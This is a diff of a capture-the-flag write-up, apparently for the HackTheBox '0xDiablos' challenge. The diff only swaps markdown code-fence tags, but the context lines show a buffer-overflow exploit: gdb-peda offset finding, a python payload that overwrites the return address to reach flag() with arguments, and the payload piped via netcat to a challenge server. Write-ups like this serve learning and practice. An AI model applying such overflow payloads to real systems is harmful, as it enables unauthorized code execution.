@@ -94,7 +94,7 @@ The assembly code for 0x21524111 is `0xdeadbeef` and 0x3f212ff3 is `0xc0ded00d`.
 ## Exploiting
 I will be using gdp-peda to exploit the `gets` function using a buffer overflow to jump into `flag()` to get the flag. Lets load the file, and start. We should hit an automatic breakpoint.
 
-```as
+```assembly
 gdb-peda$ start
 [----------------------------------registers-----------------------------------]                                                                          
 EAX: 0xf7fb1a28 --> 0xffffd1ec --> 0xffffd3c1 ("COLORFGBG=15;0")
@@ -164,7 +164,7 @@ gdb-peda$ pattern_offset 0x41417741
 
 Now lets get the address of `flag()`
 
-```as
+```assembly
 gdb-peda$ disas flag
 Dump of assembler code for function flag:
    0x080491e2 <+0>:     push   ebp
@@ -181,13 +181,15 @@ The address is 0x080491e2, which will translate to `\xe2\x91\x04\x08`
 
 I will be using python to try and jump into the function `flag()`
 
-<pre>python
+```shell-session
 ┌──(kali㉿kali)-[~/Desktop]
 └─$ python -c "print('A'*188 + '\xe2\x91\x04\x08')" | ./vuln           139 ⨯
 You know who are 0xDiablos: 
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��
 Hurry up and try in on server side.
-</pre>
+```
+
+
 
 It successfully jumped into the code function. Now i know i need to pass the args into the function, and so some googling commenced. I read about `DUMB` addresses, in which the arguements called need to be supplied in reverse order. These parameters  are 0xdeadbeef and 0xc0ded00d, which when reversed turns into:
 
@@ -200,10 +202,10 @@ This turns the entire python script into:
 ## Deploying the Exploit
 All that is needed now is to deploy the exploit to the docker server using netcat. This was done by the following:
 
-<pre>
+```shell-session
 ┌──(kali㉿kali)-[~/Desktop]
 └─$ cat exploit.txt | nc 139.59.183.98 32124
 You know who are 0xDiablos: 
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA���AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�DUMBﾭ�
 HTB{flag}  
-</pre>
+```
